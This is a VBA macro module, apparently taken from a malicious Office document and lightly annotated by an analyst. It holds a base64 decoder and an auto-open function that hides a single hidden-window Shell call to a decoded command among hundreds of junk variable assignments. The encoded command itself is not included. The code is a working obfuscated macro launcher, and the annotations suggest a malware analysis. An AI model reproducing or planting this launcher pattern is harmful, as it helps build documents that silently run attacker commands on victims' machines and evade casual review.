Attribute VB_Name = "Module2"
Function SPMfh(ByVal vCode)
   ' vcode = 
   Dim oXML
   Dim oNode
   Set oXML = CreateObject("Msxml2.DOMDocument.3.0") ' Instanciate a dom element
   Set oNode = oXML.CreateElement("base64") ' Create a new node with name base64
   oNode.dataType = "bin.base64" ' the new node will hold base64
   oNode.text = vCode 
   SPMfh = Stream_BinaryToString(oNode.nodeTypedValue) ' return
   Set oNode = Nothing
   Set oXML = Nothing
End Function

Function Stream_BinaryToString(Binary)
   Const adTypeText = 2
   Const adTypeBinary = 1
   'Create Stream object
   Dim BinaryStream 'As New Stream
   Set BinaryStream = CreateObject("ADODB.Stream") ' a special kind of fso item, reading binary data instead of ascii
   'Specify stream type - we want To save binary data.
   BinaryStream.Type = adTypeBinary
   'Open the stream And write binary data To the object
   BinaryStream.Open
   BinaryStream.Write Binary
   'Change stream type To text/string
   BinaryStream.Position = 0
   BinaryStream.Type = adTypeText
   'Specify charset For the output text (unicode) data.
   BinaryStream.CharSet = "us-ascii"
   'Open the stream And get text/string data from the object
   Stream_BinaryToString = BinaryStream.ReadText
   Set BinaryStream = Nothing
   
End Function
Public Function I4281WLDN() ' Called from AutoOpen()
   Dim Tc23t0us As Integer
   Tc23t0us = -21231 ' Assigned but never reused
   Dim OLjBp As Long
   OLjBp = Sgn(0)    ' Assigned but never reused
   Dim JEYKoa As Single
   JEYKoa = Int(53594.035154427) ' Assigned but never reused
   Dim VqTUw As Long
   VqTUw = 0         ' Assigned but never reused
   Dim aacAEFm As Integer
   aacAEFm = 18352   ' Assigned but never reused
   Dim AkOeXtqK As Long
   AkOeXtqK = Sgn(-573801918) ' Assigned but never reused
   Dim o6TYu4X8P As Long
   o6TYu4X8P = Sgn(0) ' Assigned but never reused
   Dim GKc3fLwT As Boolean
   GKc3fLwT = True    ' Assigned but never reused
   Dim UBlVCpHWz As String ' Declared but never used
   Dim IEp6WBO7 As Integer
   IEp6WBO7 = Sgn(27250) ' Assigned but never reused
   Dim RAZxYu As String
   RAZxYu = AscB("X")  ' Assigned but never reused
   Dim dl5Vswqx As Integer
   dl5Vswqx = -642
   Dim C5XIW6mvZ As Integer
   C5XIW6mvZ = -8962
   Dim m5JDqVukl As Byte
   m5JDqVukl = 20
   Dim RxvVRDs As Long
   RxvVRDs = Sgn(-864383626)
   Dim rtcvOlJe As Long
   rtcvOlJe = -411845102
   Dim yKVOGRQ As Long
   yKVOGRQ = Sgn(-1818114602)
   Dim gSMlWO As Single
   gSMlWO = 42525.917639098
   Dim HGrRi8k As Single
   HGrRi8k = 52340.185875079
   Dim ZOIhyU5ap As Boolean
   ZOIhyU5ap = True
   Dim l7pBys As Long
   l7pBys = 0
   Dim a5SKmkU As Double
   a5SKmkU = Sgn(35362.822918769)
   Dim P8hsudS As Boolean
   P8hsudS = True
   Dim KheZCr2 As Integer
   KheZCr2 = Sgn(462)
   Dim TcRUpdOw As String
   TcRUpdOw = LCase(GWC30Q)
   Dim jvLZ81Ha As Single
   jvLZ81Ha = Sgn(63976.479275882)
   Dim f8dVZ As Double
   f8dVZ = 34664.992422471
   Dim OZA1V As Long
   OZA1V = Sgn(-798286370)
   Dim zVaIBg As Byte
   zVaIBg = 84
   Dim dLzw60RJg As Long
   dLzw60RJg = 0
   Dim vcYlF3 As Byte
   vcYlF3 = 78
   Dim fTRbS5g94 As String
   fTRbS5g94 = Len(ZVGLwmR)
   Dim Vi5EcljUO As Double
   Vi5EcljUO = 63433.269715449
   Dim l0wlH As Double
   l0wlH = Sgn(44914.082465525)

   Dim LRcYQk As Boolean
   LRcYQk = False
   Dim AKArpe As Boolean
   AKArpe = False
   Dim qE31i0oMp As Single
   qE31i0oMp = 13268.472778694
   Dim kaIJAvoPf As Byte
   kaIJAvoPf = 244
   Dim yPQYX0I As Byte
   yPQYX0I = 45
   Dim FUwBCY As Integer
   FUwBCY = Sgn(19747)
   Dim ntnWJND As Integer
   ntnWJND = -15712
   Dim d9MpFy As Long
   d9MpFy = 0
   Dim LLl0D As Single
   LLl0D = Sgn(20230.709260841)
   Dim P3yepK As Integer
   P3yepK = Sgn(22500)
   Dim TA1subyIT As Byte
   TA1subyIT = 164
   Dim LXry9c As Long
   LXry9c = Sgn(0)
   Dim vtljc0RTw As Long
   vtljc0RTw = 0
   Dim wRx7V
   wRx7V = UCase(K4gJtN)
   Dim UvmLd As Integer
   UvmLd = Sgn(-13575)
   Dim WtlsTkoS2 As String
   WtlsTkoS2 = Trim(KLfMF0GQ)
   Dim lpI2s5R As Integer
   lpI2s5R = Sgn(30953)
   Dim xgYr13aO As Boolean
   xgYr13aO = False
   Dim G8jqo As Byte
   G8jqo = 175
   Dim INwQ23 As Boolean
   INwQ23 = True
   Dim kbRF6E As Single
   kbRF6E = Round(11196.604770251)
   Dim DcH4I0h As Byte
   DcH4I0h = 105
   Dim SY297oxPn As Double
   SY297oxPn = 61838.432221751
   Dim H4bVaL As Double
   H4bVaL = 44699.900913435
   Dim HMSRNfkG As Long
   HMSRNfkG = Sgn(-1811713494)
   Dim cYHfFeqpG As Single
   cYHfFeqpG = Sgn(45048.003582408)
   Dim R36qMQG As Boolean
   R36qMQG = False
   Dim hT0E4x As Long
   hT0E4x = Sgn(-423215192)
   Dim RdnBf As Integer
   RdnBf = 28739
   Dim w2OwaNprM As Byte
   w2OwaNprM = 8
   Dim jHA5VlsU
   jHA5VlsU = LCase(SXw0v4Pj)
   Dim jNEjMv As Integer
   jNEjMv = Sgn(-15082)
   Dim KH2SqD3E As Byte
   KH2SqD3E = 68
   Dim xiqC6nM As Double
   xiqC6nM = 61882.438387397
   Dim T3zCX As Boolean
   T3zCX = False
   Dim TDJFqRI3
   TDJFqRI3 = Asc("J")
   Dim gwJqgmlz As Double
   gwJqgmlz = Round(6994.981329427)
   Dim x8bU6Y As Byte
   x8bU6Y = 252
   Dim EESYjAr As Integer
   EESYjAr = Sgn(248)
   Dim KOwB1 As Long
   KOwB1 = Sgn(-1327604634)
   Dim BkhQCEs As Double
   BkhQCEs = 58590.948605604
   Dim mXhUWP5f
   mXhUWP5f = ""

   Dim PzD0JFO As Byte
   PzD0JFO = 41
   Dim c5W9ud4OH As Single
   c5W9ud4OH = Int(51488.977679594)
   Dim TFX8Hw As Single
   TFX8Hw = Fix(34297.463047448)
   Dim o3ZJp As Double
   o3ZJp = Sgn(34329.036358034)
   Dim u7jMnIsO9 As Boolean
   u7jMnIsO9 = False
   Dim cuoNb As Integer
   cuoNb = 32710
   Dim StWNa0O As Double
   StWNa0O = 62631.628788649
   Dim WdIuO
   WdIuO = Asc("q")
   Dim OL2fzOc
   OL2fzOc = Asc("c")
   Dim Ma4R3N As Boolean
   Ma4R3N = False
   Dim cuhmH85 As Single
   cuhmH85 = Sgn(39860.995767183)
   Dim Jl1FkLE7N As Long
   Jl1FkLE7N = Sgn(0)
   Dim UZ9xCR4sp As Byte
   UZ9xCR4sp = 159
   Dim sgGlx As Single
   sgGlx = 19735.730899356
   Dim dkimrKX As Byte
   dkimrKX = 42
   aotpcxJ
   Dim ee39Yn As Single
   ee39Yn = Int(24184.495931002)
   Dim aUQwN
   aUQwN = Trim(CRS4h)
   Dim mc7DWEq As Integer
   mc7DWEq = Sgn(-29570)
   Dim uKqZh As Double
   uKqZh = Fix(59083.044442635)
   Dim AlDm1gLb As Integer
   AlDm1gLb = -11474
   Dim o8Uhlr As Integer
   o8Uhlr = Sgn(730)

   Dim Nsu0BDTqH As Double
   Nsu0BDTqH = 58925.426756761
   Dim KMBsH8m As Double
   KMBsH8m = Val(37368.826085724)
   Dim Z3esrI4 As Single
   Z3esrI4 = 2385.7145921149
   Dim WBelKSbp As Long
   WBelKSbp = -693698786
   Dim JbFt3 As Integer
   JbFt3 = 7409
   Dim yiyKLUpF8 As Boolean
   yiyKLUpF8 = True
   Dim aPfLx As Double
   aPfLx = Round(56902.981091231)
   Dim N4JuapTGt As Byte
   N4JuapTGt = 153
   Dim Qkt9zuYEX As Single
   Qkt9zuYEX = Sgn(44963.207480203)
   Dim uwZopE As Single
   uwZopE = Int(7573.384689733)

   Dim Ad8qB As Byte
   Ad8qB = 151
   Dim WwLmMWg As Single
   WwLmMWg = 2149.2891466609
   Dim XiekxXWh As Long
   XiekxXWh = Sgn(0)
   Dim lVy3XbvW As Byte
   lVy3XbvW = 195
   Dim EQ1XgM5W As Long
   EQ1XgM5W = Sgn(0)
   Dim MIfLZo1 As Long
   MIfLZo1 = Sgn(-514559886)
   Dim MKNCtMfzP As Long
   MKNCtMfzP = -1076424038
   Dim YwjSdEN1
   YwjSdEN1 = LCase(bfha8)
   Dim AlfnIMvAO As Byte
   AlfnIMvAO = 156
   Dim nkWeutYBj As Integer
   nkWeutYBj = Sgn(-7787)
   Dim TVOD1 As Byte
   TVOD1 = 90
   Dim IoNaK As Boolean
   IoNaK = False
   ' Invoke some command and hides the window
   jipxOK = Shell(SPMfh(ps5q137M4), iDjg96fA) ' ps5q137M4 at macro3.vba:567 iDjg96fA at macro3.vba:3

   Dim Dk3F1m As Single
   Dk3F1m = 16661.043448826
   Dim Q8sJBN As Byte
   Q8sJBN = 252
   Dim wVe1jat As Double
   wVe1jat = 63824.324885698
   Dim B5rBJEIU As Boolean
   B5rBJEIU = False
   Dim s5uy2 As Boolean
   s5uy2 = True
   Dim rE93UaJvM As Integer
   rE93UaJvM = Sgn(-23484)
   Dim NeknZRo As Single
   NeknZRo = 11674.80763042
   Dim UdzeKFBx As Boolean
   UdzeKFBx = False
   Dim oBSJKj As Double
   oBSJKj = Int(34731.411546289)
   Dim ytpKPC As Double
   ytpKPC = Int(13111.32658222)
   Dim SYULjH
   SYULjH = LCase(MzkAM83)
   Dim gWpofvDR As Double
   gWpofvDR = Val(47683.230288957)
   Dim TeGxdl As Integer
   TeGxdl = 3186
   Dim QM5cbNjgW As Long
   QM5cbNjgW = Sgn(0)
   Dim Cw5DocqI As Single
   Cw5DocqI = 46695.598420713
   Dim w8L5s As Long
   w8L5s = Sgn(0)
   Dim ut3jmOYW As Long
   ut3jmOYW = Sgn(0)

   Dim VvyLU1QMJ As Byte
   VvyLU1QMJ = 6
   Dim Re3Hwhoi As Boolean
   Re3Hwhoi = False
   Dim nzyGeq As Byte
   nzyGeq = 197
   Dim acranHE
   acranHE = Len(aCZG9JOe)
   Dim kLXwIlKjb As Integer
   kLXwIlKjb = -10413
   Dim CjZ8cs As Boolean
   CjZ8cs = True
   Dim i1J5mEA As Byte
   i1J5mEA = 72
   Dim LGdLAo As Double
   LGdLAo = Sgn(25522.314787058)

   Dim ntRCc As Boolean
   ntRCc = True
   Dim TRZxF As Integer
   TRZxF = Sgn(12809)
   Dim YMld7cDPe As Single
   YMld7cDPe = Round(43118.655925101)
   Dim cmBX17st As Boolean
   cmBX17st = False
   Dim bjZ0Q As Integer
   bjZ0Q = 30574
   Dim dUFN9wt As String
   dUFN9wt = RTrim(hpqW5rhJK)
   Dim kwaUMJ0 As Double
   kwaUMJ0 = Sgn(15207.188335304)
   Dim eKakjL As Byte
   eKakjL = 225
   Dim jGnRd8 As Byte
   jGnRd8 = 122
   Dim ZgGDUN As Long
   ZgGDUN = Sgn(-548696618)
   Dim DWo9m7h1R
   DWo9m7h1R = AscB("Z")
   Dim Hb2ks8qu9 As Byte
   Hb2ks8qu9 = 83
   Dim x5grse As Long
   x5grse = Sgn(-871234264)
   Dim a3FlN As Long
   a3FlN = Sgn(0)
   Dim A8BpQtdUs As Integer
   A8BpQtdUs = Sgn(16132)
   Dim Gk3uY As Long
   Gk3uY = -765208110
   Dim N9lfMvLZ As Integer
   N9lfMvLZ = 3380
   Dim qdTvr6 As Double
   qdTvr6 = 11896.70793701
   Dim U8mxuFr As Boolean
   U8mxuFr = True
   Dim R9ODLuzB As Integer
   R9ODLuzB = Sgn(-629)
   Dim V6HbIkvmU
   V6HbIkvmU = RTrim(yIeoJTt)
   Dim aeguNYy6 As Byte
   aeguNYy6 = 172
   Dim weBM1KI9Z As Byte
   weBM1KI9Z = 233
   Dim Gqt73 As Integer
   Gqt73 = Sgn(-21034)
   Dim rYlJxCeRL As Boolean
   rYlJxCeRL = False
   Dim huwTPJx As Boolean
   huwTPJx = False
   Dim mWza4 As Boolean
   mWza4 = False
   Dim RDwfTcGHg As Boolean
   RDwfTcGHg = True
   Dim ky4SV85k As Boolean
   ky4SV85k = False
   Dim QlXEy3xZ As Integer
   QlXEy3xZ = Sgn(-22321)
   Dim BkQF2 As Single
   BkQF2 = Sgn(35249.032507223)
   Dim ik9nXfd As Long
   ik9nXfd = Sgn(0)
   Dim jsJRSkd As Double
   jsJRSkd = Sgn(29294.253335973)
   Dim TKeay
   TKeay = Len(gLaWJs)
   Dim LeJMwzWyl As Double
   LeJMwzWyl = Fix(50028.057488139)
   Dim Afh7RACB As Byte
   Afh7RACB = 63
   Dim wmoWON5 As Boolean
   wmoWON5 = True
   Dim W6e1q As Long
   W6e1q = -63443894
   Dim VUO7ukbcX As Double
   VUO7ukbcX = Int(4442.6241186859)
   Dim nDuNkh As Boolean
   nDuNkh = True
   Dim pFkezpZ7 As Single
   pFkezpZ7 = Val(13302.677885132)
   Dim KnLsw53x As Double
   KnLsw53x = Int(36341.197939487)
   Dim RUYujZ6be As Byte
   RUYujZ6be = 211
   Dim J1ITD9 As Integer
   J1ITD9 = Sgn(-11364)
   Dim t4ocj3PL
   t4ocj3PL = ""
   Dim oM49yFt As Boolean
   oM49yFt = True
   Dim xPeB4 As Integer
   xPeB4 = -25568

   Dim awtFfHDj As Byte
   awtFfHDj = 197
   Dim DcsujO0Wv As Long
   DcsujO0Wv = -661540440
   Dim vYG5NP As Double
   vYG5NP = Sgn(59423.60224362)
   Dim XKt4pAgW As Single
   XKt4pAgW = Int(24510.56826537)
   Dim MkcN3MDRW As Long
   MkcN3MDRW = Sgn(-1488910936)
   Dim zCIFwl4 As Boolean
   zCIFwl4 = True
   Dim DqKeibc As Single
   DqKeibc = Sgn(16467.069627266)
   Dim GPd8gjiKF As Single
   GPd8gjiKF = 47115.584180571
   Dim KzeMT As Byte
   KzeMT = 223
   Dim Xgo6fIZ As Long
   Xgo6fIZ = -1817357702
   Dim tZJHyg1m As Single
   tZJHyg1m = 34771.032250169

   Dim ujpYc0Jo As Byte
   ujpYc0Jo = 122
   Dim TD2o7dmJ As Long
   TD2o7dmJ = -1139583534
   Dim XkmMfWxV5 As Byte
   XkmMfWxV5 = 144
   Dim qvW4Tu As Byte
   qvW4Tu = 66
   Dim t9uDq As Double
   t9uDq = Fix(52926.251197537)
   Dim VgYvpQ As Byte
   VgYvpQ = 221
   Dim m9Bj2 As Boolean
   m9Bj2 = True
   Dim wAYrJcsdg As Double
   wAYrJcsdg = Int(59753.311607551)
   Dim PzpTD5iP2 As Single
   PzpTD5iP2 = Round(25254.411732684)
   Dim h9hd6z As Byte
   h9hd6z = 123
   Dim Nlg2yzoT As Integer
   Nlg2yzoT = 7573
   Dim OzviuU As Single
   OzviuU = Int(24280.566122957)
   Dim upzxkeUgw As Single
   upzxkeUgw = 42287.760042293

   Dim tX4Z3vHb As Long
   tX4Z3vHb = 0
   Dim trfe5 As Single
   trfe5 = 11306.162824389
   Dim fSrkG As Boolean
   fSrkG = True
   Dim rTB8Z As Boolean
   rTB8Z = False
   Dim wgjS25 As String
   wgjS25 = AscW("h")
   Dim EANI1P6 As Double
   EANI1P6 = 28027.90223289
   Dim WESf0VQ
   WESf0VQ = AscW("_")
   Dim jLtzUJ As Single
   jLtzUJ = Fix(35484.434256111)
   Dim Kr8NRSPCA As Long
   Kr8NRSPCA = 0
   Dim vBriLzJ As Byte
   vBriLzJ = 172
   Dim Up9BUwf8 As String
   Up9BUwf8 = "d"
   Dim rX73ow
   rX73ow = vbNullString
   '

   Dim lHNMI3P As Boolean
   lHNMI3P = True
   Dim HU1LcnGw As Long
   HU1LcnGw = 0
   Dim mBPKsq5yM As Integer
   mBPKsq5yM = 23880
   Dim z6hB1HERF As Single
   z6hB1HERF = Int(15431.224198966)
   Dim Z8OASCE As Long
   Z8OASCE = Sgn(-1339843494)
   Dim iYqOCjN As Integer
   iYqOCjN = Sgn(42)
   Dim EAos0rPQJ As Double
   EAos0rPQJ = Sgn(40981.132971873)
   Dim YKpNMbUZu As Long
   YKpNMbUZu = -1961955864
   Dim SlW4TI75r As Integer
   SlW4TI75r = 7160
   Dim pNKhuC As Double
   pNKhuC = 39852.740064074
   Dim bGkeVM As Single
   bGkeVM = Round(35766.457670358)
   Dim wfohBQ As Integer
   wfohBQ = 11626
   Dim xmsRH As Boolean
   xmsRH = False
   Dim Ytub5 As Byte
   Ytub5 = 230
   '
   Dim GYMwUJTG As Long
   GYMwUJTG = Sgn(-266130610)
   Dim X5f8ZXz As Integer
   X5f8ZXz = -19696
   Dim zQh1l As Byte
   zQh1l = 102
   Dim mzKEnwA As Boolean
   mzKEnwA = True
   Dim Ekwdng9 As Single
   Ekwdng9 = 35372.692794068
   Dim NHqm9lC As Single
   NHqm9lC = Sgn(45771.593543522)
   Dim f4Okf As Byte
   f4Okf = 211
   Dim dDtJ1C6ay As Byte
   dDtJ1C6ay = 181
   Dim wuRNp3 As Long
   wuRNp3 = -1867521096
   Dim rSPp38Z As Boolean
   rSPp38Z = True
   Dim IsyFmzo As Single
   IsyFmzo = 65185.299333878
   Dim kfQG84kh As Boolean
   kfQG84kh = True
   '
   Dim au1J42 As Double
   au1J42 = Sgn(6875.611840262)
   Dim xOnvl As String
   xOnvl = LCase(h1Gbse)
   Dim njX9L1GV As String
   njX9L1GV = AscB("*")
   Dim WtkmW1S As Long
   WtkmW1S = Sgn(0)
   Dim KnICd0Sh As Double
   KnICd0Sh = 15571.083244203
   Dim FTXOnbdq7
   FTXOnbdq7 = StrConv(psTAh, vbLowerCase)
   Dim YVZuo As Byte
   YVZuo = 176
   Dim URkzWsrq As String
   URkzWsrq = Len(a5FqAp)
   Dim NLpJN6V As Byte
   NLpJN6V = 183
   Dim fkvegcYr As String
   fkvegcYr = Len(oIc8p6vbY)
   Dim gSNE9 As Double
   gSNE9 = 26954.258369096
   Dim vKUqvsfSM As Byte
   vKUqvsfSM = 46
   Dim UQuGg As Single
   UQuGg = 7388.5579456444
   Dim PSDpEV As Double
   PSDpEV = 23497.001580977
   Dim YAF6qpcm As Single
   YAF6qpcm = Round(2638.5780196114)
   '
   Dim NOA5jUJ As Integer
   NOA5jUJ = Sgn(-12993)
   Dim upJriDlL As Boolean
   upJriDlL = True
   Dim Fb6Zz As Boolean
   Fb6Zz = False
   Dim AYB8w As Boolean
   AYB8w = True
   Dim OoQNGir2V As Long
   OoQNGir2V = 0
   Dim Qo9wTsEe
   Qo9wTsEe = LTrim(fNaLz)
   '
   Dim iuZhj9XOS As String
   iuZhj9XOS = LTrim(HJ41NS)
   Dim Qe67T8a1W As Long
   Qe67T8a1W = Sgn(0)
   Dim FN0SYC As Byte
   FN0SYC = 184
   Dim p8f39 As Double
   p8f39 = Fix(8632.5288354186)
   Dim swZKMJUd As Long
   swZKMJUd = -1803872414
   Dim HPAzUZG As Boolean
   HPAzUZG = True
   Dim ev87KJ9
   ev87KJ9 = Val(vH40Adq5j)
   Dim lg1FQ
   lg1FQ = StrConv(kksyiED0f, vbUpperCase)
   Dim yRcm2H As Boolean
   yRcm2H = False
   Dim OTPoIvEMG As Single
   OTPoIvEMG = Val(22638.081466825)
   Dim UNjBZM9 As String
   UNjBZM9 = LCase(g38uhDUv)
   Dim sjhBFu7 As Single
   sjhBFu7 = 858.27975827824
   Dim ftKHdLc As Boolean
   ftKHdLc = True
   Dim vbRV83 As Boolean
   vbRV83 = False
   Dim GuEcA7Is As Long
   GuEcA7Is = Sgn(-1415377034)
   Dim sqd3XsbD
   sqd3XsbD = Val(xHOlS)
   Dim yxuGn0 As Byte
   yxuGn0 = 120
   Dim KnDujX2K As Byte
   KnDujX2K = 120
   Dim Nd6e1b7 As Long
   Nd6e1b7 = 0
   Dim RtxZmlp As Double
   RtxZmlp = Fix(61137.963459974)
   Dim HGW7L As Long
   HGW7L = 0
   Dim TTkILij As Boolean
   TTkILij = True
   Dim WlzjCKMe As Single
   WlzjCKMe = Sgn(21977.118298376)

End Function
